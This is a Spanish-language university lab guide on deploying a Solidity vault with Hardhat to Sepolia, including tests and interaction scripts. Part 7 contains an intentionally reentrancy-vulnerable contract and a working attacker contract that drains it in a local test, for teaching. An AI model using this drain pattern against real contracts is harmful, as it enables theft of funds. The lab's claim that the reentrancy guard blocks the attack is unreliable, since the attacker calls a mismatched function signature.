# Laboratorio — Despliegue Profesional con Hardhat

**Materia:** Blockchain y Bases de Datos Distribuidas | **Carrera:** Ciberseguridad y Desarrollo de Software
**Tema:** Desarrollo en Solidity Avanzado — Herramientas de despliegue y ciclo de vida de una DApp

---

## Propósito

Al terminar este laboratorio serás capaz de:

- Configurar un entorno de desarrollo profesional con Hardhat fuera de Remix
- Compilar, probar y desplegar un contrato inteligente en una red de pruebas real (Sepolia)
- Identificar y corregir una vulnerabilidad de reentrancy mediante el patrón checks-effects-interactions
- Interactuar con un contrato desplegado mediante scripts de Hardhat

**Caso guía:** Tu equipo aprobó el contrato de los laboratorios anteriores en Remix. Antes de desplegarlo en Mainnet, el proceso profesional exige: entorno versionado, pruebas automatizadas, despliegue reproducible y verificación en testnet. Tu tarea es ejecutar ese ciclo completo.

---

## Requisitos

- Node.js 18+ instalado: [https://nodejs.org](https://nodejs.org)
- Cuenta en MetaMask: [https://metamask.io](https://metamask.io)
- Cuenta en Alchemy (gratuita): [https://alchemy.com](https://alchemy.com)
- ETH de prueba en Sepolia: [https://sepoliafaucet.com](https://sepoliafaucet.com)

Verifica tu entorno antes de continuar:

```bash
node --version
npm --version
```

Anota ambas versiones en tu reporte. Si Node es menor a 18, actualiza antes de continuar.

---

## Parte 1 — Configura el entorno profesional

**Paso 1.1 — Inicializa el proyecto**

```bash
mkdir dapp-lab && cd dapp-lab
npm init -y
npm install --save-dev hardhat
npx hardhat init
```

Cuando el asistente pregunte, selecciona: **Create a JavaScript project**. Acepta todas las opciones por defecto.

Observa la estructura que genera Hardhat:

```
dapp-lab/
├── contracts/       ← Contratos Solidity
├── ignition/        ← Módulos de despliegue
├── test/            ← Pruebas automatizadas
├── hardhat.config.js
└── package.json
```

Antes de continuar, investiga y responde en tu reporte: ¿qué es Hardhat Network y en qué se diferencia de Ganache? Ambos son simuladores locales de Ethereum — ¿cuál es la ventaja concreta de Hardhat Network para el desarrollo?

**Paso 1.2 — Instala dependencias adicionales**

```bash
npm install --save-dev @nomicfoundation/hardhat-toolbox
npm install dotenv
```

¿Para qué sirve `dotenv` en el contexto de despliegue de contratos? Investiga y responde antes de continuar — su uso en el Paso 3 depende de que lo comprendas ahora.

> Captura obligatoria: estructura de carpetas del proyecto en tu terminal después de la inicialización.

---

## Parte 2 — Escribe y compila el contrato

**Paso 2.1 — Crea el contrato**

Elimina el contrato de ejemplo y crea `contracts/BovedaSegura.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title BovedaSegura
 * @notice Contrato de depósito/retiro con protección contra reentrancy
 * @dev Implementa el patrón Checks-Effects-Interactions
 */
contract BovedaSegura {

    mapping(address => uint256) private saldos;
    uint256 public totalDepositado;
    address public propietario;
    bool private bloqueado;

    event Deposito(address indexed cuenta, uint256 monto);
    event Retiro(address indexed cuenta, uint256 monto);
    event EmergenciaActivada(address por);

    modifier sinReentrada() {
        require(!bloqueado, "Reentrancy detectado");
        bloqueado = true;
        _;
        bloqueado = false;
    }

    modifier soloPropietario() {
        require(msg.sender == propietario, "No autorizado");
        _;
    }

    constructor() {
        propietario = msg.sender;
    }

    function depositar() external payable {
        require(msg.value > 0, "Monto requerido");
        saldos[msg.sender] += msg.value;
        totalDepositado += msg.value;
        emit Deposito(msg.sender, msg.value);
    }

    function retirar(uint256 monto) external sinReentrada {
        // CHECKS: verifica antes de modificar estado
        require(monto > 0, "Monto invalido");
        require(saldos[msg.sender] >= monto, "Saldo insuficiente");

        // EFFECTS: modifica el estado antes de transferir
        saldos[msg.sender] -= monto;
        totalDepositado -= monto;

        // INTERACTIONS: transfiere después de actualizar estado
        (bool exito, ) = msg.sender.call{value: monto}("");
        require(exito, "Transferencia fallida");

        emit Retiro(msg.sender, monto);
    }

    function consultarSaldo(address cuenta) external view returns (uint256) {
        return saldos[cuenta];
    }

    function balanceContrato() external view returns (uint256) {
        return address(this).balance;
    }
}
```

**Paso 2.2 — Compila**

```bash
npx hardhat compile
```

Anota en tu reporte:

- ¿Qué versión del compilador de Solidity usó Hardhat?
- ¿Qué archivos generó en la carpeta `artifacts/`?
- Localiza el archivo `artifacts/contracts/BovedaSegura.sol/BovedaSegura.json` y encuentra el campo `"bytecode"`. Copia los primeros 20 caracteres en tu reporte.

El patrón **Checks-Effects-Interactions** está implementado explícitamente en la función `retirar`. Antes de continuar, responde: ¿qué ocurriría si el orden fuera Checks-Interactions-Effects? Describe el ataque exacto que sería posible si se transfiriera ETH antes de actualizar `saldos[msg.sender]`.

> Captura obligatoria: salida de `npx hardhat compile` sin errores.

---

## Parte 3 — Pruebas automatizadas

**Paso 3.1 — Escribe las pruebas**

Elimina el archivo de prueba de ejemplo y crea `test/BovedaSegura.test.js`:

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("BovedaSegura", function () {
  let boveda;
  let propietario, usuario1, usuario2;

  beforeEach(async function () {
    [propietario, usuario1, usuario2] = await ethers.getSigners();
    const BovedaSegura = await ethers.getContractFactory("BovedaSegura");
    boveda = await BovedaSegura.deploy();
    await boveda.waitForDeployment();
  });

  describe("Despliegue", function () {
    it("Debe asignar al deployer como propietario", async function () {
      expect(await boveda.propietario()).to.equal(propietario.address);
    });

    it("Debe iniciar con balance cero", async function () {
      expect(await boveda.balanceContrato()).to.equal(0n);
    });
  });

  describe("Depósitos", function () {
    it("Debe registrar un depósito correctamente", async function () {
      const monto = ethers.parseEther("1.0");
      await boveda.connect(usuario1).depositar({ value: monto });

      expect(await boveda.consultarSaldo(usuario1.address)).to.equal(monto);
      expect(await boveda.totalDepositado()).to.equal(monto);
    });

    it("Debe emitir el evento Deposito", async function () {
      const monto = ethers.parseEther("0.5");
      await expect(boveda.connect(usuario1).depositar({ value: monto }))
        .to.emit(boveda, "Deposito")
        .withArgs(usuario1.address, monto);
    });

    it("Debe rechazar depósitos de cero", async function () {
      await expect(
        boveda.connect(usuario1).depositar({ value: 0 })
      ).to.be.revertedWith("Monto requerido");
    });
  });

  describe("Retiros", function () {
    beforeEach(async function () {
      await boveda.connect(usuario1).depositar({
        value: ethers.parseEther("2.0"),
      });
    });

    it("Debe procesar un retiro válido", async function () {
      const monto = ethers.parseEther("1.0");
      const saldoAntes = await ethers.provider.getBalance(usuario1.address);

      const tx = await boveda.connect(usuario1).retirar(monto);
      const recibo = await tx.wait();
      const gasGastado = recibo.gasUsed * recibo.gasPrice;

      const saldoDespues = await ethers.provider.getBalance(usuario1.address);

      expect(saldoDespues).to.equal(saldoAntes + monto - gasGastado);
    });

    it("Debe rechazar retiro mayor al saldo", async function () {
      const montoExcesivo = ethers.parseEther("5.0");
      await expect(
        boveda.connect(usuario1).retirar(montoExcesivo)
      ).to.be.revertedWith("Saldo insuficiente");
    });

    it("Debe emitir el evento Retiro", async function () {
      const monto = ethers.parseEther("1.0");
      await expect(boveda.connect(usuario1).retirar(monto))
        .to.emit(boveda, "Retiro")
        .withArgs(usuario1.address, monto);
    });

    it("Debe actualizar totalDepositado tras el retiro", async function () {
      const depositoInicial = ethers.parseEther("2.0");
      const montoRetiro = ethers.parseEther("1.0");
      await boveda.connect(usuario1).retirar(montoRetiro);
      expect(await boveda.totalDepositado()).to.equal(
        depositoInicial - montoRetiro
      );
    });
  });

  describe("Múltiples usuarios", function () {
    it("Debe mantener saldos independientes por usuario", async function () {
      await boveda.connect(usuario1).depositar({
        value: ethers.parseEther("1.0"),
      });
      await boveda.connect(usuario2).depositar({
        value: ethers.parseEther("3.0"),
      });

      expect(await boveda.consultarSaldo(usuario1.address)).to.equal(
        ethers.parseEther("1.0")
      );
      expect(await boveda.consultarSaldo(usuario2.address)).to.equal(
        ethers.parseEther("3.0")
      );
    });
  });
});
```

**Paso 3.2 — Ejecuta las pruebas**

```bash
npx hardhat test
```

Anota en tu reporte:

- ¿Cuántas pruebas pasaron?
- ¿Cuánto tiempo tardó cada suite en ejecutarse?
- ¿Qué red usó Hardhat para ejecutar las pruebas? ¿Fue necesario desplegar en ninguna red externa?

```bash
npx hardhat test --reporter gas
```

Con el reporte de gas, anota el costo promedio en gas de `depositar()` y `retirar()`. Compara esos valores con los que mediste manualmente en Remix en laboratorios anteriores. ¿Son consistentes?

**Paso 3.3 — Cobertura de pruebas**

```bash
npx hardhat coverage
```

Anota el porcentaje de cobertura de líneas (`Lines`) y de ramas (`Branches`). Si algún porcentaje es menor al 80%, identifica qué líneas del contrato no están cubiertas y explica por qué importa cubrirlas.

> Captura obligatoria: salida de `npx hardhat test` con todas las pruebas en verde y reporte de gas visible.

---

## Parte 4 — Configura el despliegue a Sepolia

**Paso 4.1 — Obtén credenciales**

Necesitas dos elementos antes de desplegar en una red real:

1. **URL de nodo RPC** — Crea una app en Alchemy ([https://dashboard.alchemy.com](https://dashboard.alchemy.com)), selecciona la red Sepolia y copia el HTTPS endpoint.
2. **Llave privada de MetaMask** — En MetaMask: Configuración → Seguridad → Revelar frase semilla. Para obtener la llave privada de una cuenta: tres puntos → Detalles de cuenta → Exportar llave privada.

Usa una cuenta exclusiva para desarrollo. Nunca uses una cuenta con fondos reales.

**Paso 4.2 — Configura variables de entorno**

Crea el archivo `.env` en la raíz del proyecto:

```
ALCHEMY_SEPOLIA_URL=https://eth-sepolia.g.alchemy.com/v2/TU_API_KEY
PRIVATE_KEY=0xtu_llave_privada_aqui
```

Crea inmediatamente el archivo `.gitignore`:

```
node_modules
.env
artifacts
cache
coverage
```

¿Por qué es crítico que `.env` esté en `.gitignore`? Investiga al menos un caso real documentado de pérdida de fondos por exponer una llave privada en un repositorio público y anota la fuente.

**Paso 4.3 — Actualiza hardhat.config.js**

```javascript
require("@nomicfoundation/hardhat-toolbox");
require("dotenv").config();

module.exports = {
  solidity: "0.8.20",
  networks: {
    hardhat: {},
    sepolia: {
      url: process.env.ALCHEMY_SEPOLIA_URL,
      accounts: [process.env.PRIVATE_KEY],
    },
  },
};
```

---

## Parte 5 — Despliega en Sepolia

**Paso 5.1 — Obtén ETH de prueba**

Accede a [https://sepoliafaucet.com](https://sepoliafaucet.com) o [https://faucets.chain.link/sepolia](https://faucets.chain.link/sepolia). Solicita ETH de prueba para tu dirección de MetaMask.

Verifica que lo recibiste:

```bash
npx hardhat run --network sepolia scripts/verifica-saldo.js
```

Crea `scripts/verifica-saldo.js`:

```javascript
const { ethers } = require("hardhat");

async function main() {
  const [deployer] = await ethers.getSigners();
  const saldo = await ethers.provider.getBalance(deployer.address);
  console.log("Dirección del deployer:", deployer.address);
  console.log("Saldo en Sepolia:", ethers.formatEther(saldo), "ETH");
}

main().catch(console.error);
```

Anota en tu reporte: la dirección de tu deployer y el saldo disponible en Sepolia.

**Paso 5.2 — Script de despliegue**

Crea `scripts/deploy.js`:

```javascript
const { ethers } = require("hardhat");

async function main() {
  const [deployer] = await ethers.getSigners();
  
  console.log("Desplegando con la cuenta:", deployer.address);
  
  const saldoAntes = await ethers.provider.getBalance(deployer.address);
  console.log("Saldo antes del despliegue:", ethers.formatEther(saldoAntes), "ETH");

  console.log("\nDesplegando BovedaSegura...");
  const BovedaSegura = await ethers.getContractFactory("BovedaSegura");
  const boveda = await BovedaSegura.deploy();
  await boveda.waitForDeployment();

  const direccionContrato = await boveda.getAddress();
  console.log("Contrato desplegado en:", direccionContrato);

  const saldoDespues = await ethers.provider.getBalance(deployer.address);
  const costoDespliegue = saldoAntes - saldoDespues;
  console.log("\nCosto del despliegue:", ethers.formatEther(costoDespliegue), "ETH");
  console.log("Verifica en: https://sepolia.etherscan.io/address/" + direccionContrato);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
```

Ejecuta el despliegue:

```bash
npx hardhat run scripts/deploy.js --network sepolia
```

Anota en tu reporte:

- La dirección del contrato desplegado
- El costo en ETH del despliegue
- El hash de la transacción de creación (encuéntralo en Etherscan con la dirección del contrato)

Abre `https://sepolia.etherscan.io/address/TU_DIRECCION` y verifica que el contrato aparece como "Contract" y no como EOA. ¿Qué campo confirma que es una cuenta de contrato y no una cuenta de propietario?

> Captura obligatoria: salida del despliegue con la dirección del contrato y página del contrato en Sepolia Etherscan.

---

## Parte 6 — Interactúa con el contrato desplegado

**Paso 6.1 — Script de interacción**

Crea `scripts/interactuar.js`. Reemplaza `DIRECCION_CONTRATO` con la dirección que obtuviste:

```javascript
const { ethers } = require("hardhat");

const DIRECCION_CONTRATO = "0xTU_DIRECCION_AQUI";

async function main() {
  const [usuario] = await ethers.getSigners();
  const boveda = await ethers.getContractAt("BovedaSegura", DIRECCION_CONTRATO);

  console.log("=== INTERACCIÓN CON CONTRATO EN SEPOLIA ===\n");
  console.log("Contrato:", DIRECCION_CONTRATO);
  console.log("Usuario:", usuario.address);

  // Depósito
  const montoDeposito = ethers.parseEther("0.01");
  console.log("\n1. Depositando", ethers.formatEther(montoDeposito), "ETH...");
  const txDeposito = await boveda.depositar({ value: montoDeposito });
  await txDeposito.wait();
  console.log("   TX Hash:", txDeposito.hash);

  // Consulta saldo
  const saldo = await boveda.consultarSaldo(usuario.address);
  console.log("\n2. Saldo en contrato:", ethers.formatEther(saldo), "ETH");

  // Retiro parcial
  const montoRetiro = ethers.parseEther("0.005");
  console.log("\n3. Retirando", ethers.formatEther(montoRetiro), "ETH...");
  const txRetiro = await boveda.retirar(montoRetiro);
  await txRetiro.wait();
  console.log("   TX Hash:", txRetiro.hash);

  // Saldo final
  const saldoFinal = await boveda.consultarSaldo(usuario.address);
  const balanceContrato = await boveda.balanceContrato();
  console.log("\n4. Saldo final en contrato:", ethers.formatEther(saldoFinal), "ETH");
  console.log("   Balance total del contrato:", ethers.formatEther(balanceContrato), "ETH");
  
  console.log("\n=== VERIFICA LAS TRANSACCIONES ===");
  console.log("https://sepolia.etherscan.io/address/" + DIRECCION_CONTRATO);
}

main().catch(console.error);
```

```bash
npx hardhat run scripts/interactuar.js --network sepolia
```

Anota en tu reporte:

- El hash de la transacción de depósito
- El hash de la transacción de retiro
- El balance final del contrato

Abre ambos hashes en Sepolia Etherscan. Para cada transacción registra:

- Estado (Success / Failed)
- Gas usado
- Gas price en Gwei
- Tarifa total en ETH

Con esos valores calcula: ¿cuánto más costó el retiro que el depósito en términos de gas? ¿A qué se debe esa diferencia considerando lo que hace cada función internamente?

> Captura obligatoria: salida del script de interacción con ambos TX hashes, y páginas de ambas transacciones en Sepolia Etherscan.

---

## Parte 7 — Seguridad: demuestra la vulnerabilidad que el contrato previene

**Paso 7.1 — Implementa el contrato vulnerable**

Para entender por qué el patrón Checks-Effects-Interactions importa, crea `contracts/BovedaVulnerable.sol` con el orden incorrecto:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ADVERTENCIA: Este contrato es vulnerable a reentrancy intencionalmente.
// Solo para fines educativos. No desplegar en Mainnet.
contract BovedaVulnerable {
    mapping(address => uint256) public saldos;

    function depositar() external payable {
        saldos[msg.sender] += msg.value;
    }

    // VULNERABLE: transfiere antes de actualizar el estado
    function retirar() external {
        uint256 monto = saldos[msg.sender];
        require(monto > 0, "Sin saldo");

        // INTERACTIONS primero — ERROR CRÍTICO
        (bool exito, ) = msg.sender.call{value: monto}("");
        require(exito, "Fallo");

        // EFFECTS después — demasiado tarde
        saldos[msg.sender] = 0;
    }
}
```

Crea la prueba que demuestra el ataque en `test/Reentrancy.test.js`:

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Demostración de Reentrancy Attack", function () {
  it("Debe demostrar que BovedaVulnerable es explotable", async function () {
    const [victima, atacante] = await ethers.getSigners();

    // Despliega la bóveda vulnerable
    const BovedaVulnerable = await ethers.getContractFactory("BovedaVulnerable");
    const boveda = await BovedaVulnerable.deploy();
    await boveda.waitForDeployment();

    // La víctima deposita 5 ETH
    await boveda.connect(victima).depositar({ value: ethers.parseEther("5.0") });
    console.log("Balance bóveda (víctima depositó):", 
      ethers.formatEther(await ethers.provider.getBalance(await boveda.getAddress())), "ETH");

    // Despliega el contrato atacante
    const Atacante = await ethers.getContractFactory("ContratoAtacante");
    const contratoAtacante = await Atacante.deploy(await boveda.getAddress());
    await contratoAtacante.waitForDeployment();

    // El atacante deposita solo 1 ETH y luego drena la bóveda
    await contratoAtacante.connect(atacante).atacar({ value: ethers.parseEther("1.0") });

    const balanceFinal = await ethers.provider.getBalance(await boveda.getAddress());
    console.log("Balance bóveda (después del ataque):", ethers.formatEther(balanceFinal), "ETH");

    // La bóveda debería estar drenada
    expect(balanceFinal).to.equal(0n);
  });

  it("Debe demostrar que BovedaSegura NO es explotable", async function () {
    const [victima] = await ethers.getSigners();

    const BovedaSegura = await ethers.getContractFactory("BovedaSegura");
    const boveda = await BovedaSegura.deploy();
    await boveda.waitForDeployment();

    await boveda.connect(victima).depositar({ value: ethers.parseEther("5.0") });

    const Atacante = await ethers.getContractFactory("ContratoAtacante");
    const contratoAtacante = await Atacante.deploy(await boveda.getAddress());
    await contratoAtacante.waitForDeployment();

    // El ataque debe fallar contra la versión segura
    await expect(
      contratoAtacante.atacar({ value: ethers.parseEther("1.0") })
    ).to.be.reverted;

    console.log("Ataque bloqueado por el modificador sinReentrada");
  });
});
```

Crea `contracts/ContratoAtacante.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBoveda {
    function depositar() external payable;
    function retirar() external;
}

// Solo para demostración educativa
contract ContratoAtacante {
    IBoveda public objetivo;
    address public propietario;

    constructor(address _objetivo) {
        objetivo = IBoveda(_objetivo);
        propietario = msg.sender;
    }

    function atacar() external payable {
        objetivo.depositar{value: msg.value}();
        objetivo.retirar();
    }

    // Esta función se llama automáticamente cuando el contrato recibe ETH
    receive() external payable {
        if (address(objetivo).balance >= msg.value) {
            objetivo.retirar(); // Llama de nuevo antes de que actualice el saldo
        }
    }

    function retirarGanancias() external {
        require(msg.sender == propietario);
        payable(propietario).transfer(address(this).balance);
    }
}
```

Ejecuta las pruebas:

```bash
npx hardhat test test/Reentrancy.test.js --reporter verbose
```

Con la salida que obtuviste, responde en tu reporte:

- ¿Cuántos ETH logró drenar el atacante en la versión vulnerable?
- ¿Cuántas veces se llamó la función `receive()` del atacante durante el ataque?
- ¿Qué línea específica del modificador `sinReentrada` bloqueó el ataque en `BovedaSegura`?

> Captura obligatoria: salida de las dos pruebas de reentrancy con sus resultados.

---

## Parte 8 — Reflexión final

Responde con base en lo que ejecutaste e investigaste:

1. En la Parte 3 mediste el costo en gas de `depositar()` y `retirar()` con Hardhat. En la Parte 6 verificaste el costo real en Sepolia Etherscan en ETH. Usando el precio de gas que encontraste en Etherscan para tus transacciones, calcula cuánto costaría ejecutar `retirar()` en Mainnet si el gas price fuera 30 Gwei. ¿Ese costo sería aceptable para un usuario que retira 10 USD en ETH?
2. En la Parte 7 demostraste que `BovedaVulnerable` puede ser drenada completamente. El DAO Hack de 2016 explotó exactamente esta vulnerabilidad y resultó en la pérdida de 60 millones de USD. Investiga qué decisión tomó la comunidad de Ethereum para recuperar esos fondos y qué consecuencia arquitectónica permanente tuvo esa decisión para la red. ¿Contradice esa decisión el principio de inmutabilidad que estudiaste?
3. El ciclo completo que ejecutaste hoy (Write → Test → Deploy → Interact) es el estándar profesional. Sin embargo, el contrato desplegado en Sepolia no puede modificarse si se descubre un bug. ¿Qué patrón arquitectónico mencionado en la presentación del curso permite actualizar la lógica de un contrato después de desplegarlo? Describe brevemente cómo funciona ese patrón.

---

## Checklist de cierre

Antes de entregar verifica:

- [x] Versiones de Node.js y npm registradas
- [x] Estructura del proyecto Hardhat capturada
- [x] Bytecode de `BovedaSegura` (primeros 20 caracteres) anotado
- [x] Todas las pruebas de `BovedaSegura.test.js` en verde (captura)
- [x] Reporte de gas de `npx hardhat test --reporter gas` con costos anotados
- [x] Porcentaje de cobertura de pruebas registrado
- [x] Dirección del contrato desplegado en Sepolia anotada
- [x] Costo del despliegue en ETH registrado
- [x] Hashes de transacciones de depósito y retiro en Sepolia con sus costos
- [x] Pruebas de reentrancy ejecutadas con resultados documentados
- [x] Tres preguntas de reflexión respondidas con datos del laboratorio

---

**Entregable:** Reporte APA 7 con capturas de terminal y Etherscan en cada sección, dirección del contrato verificable en Sepolia y declaración de uso de IA.
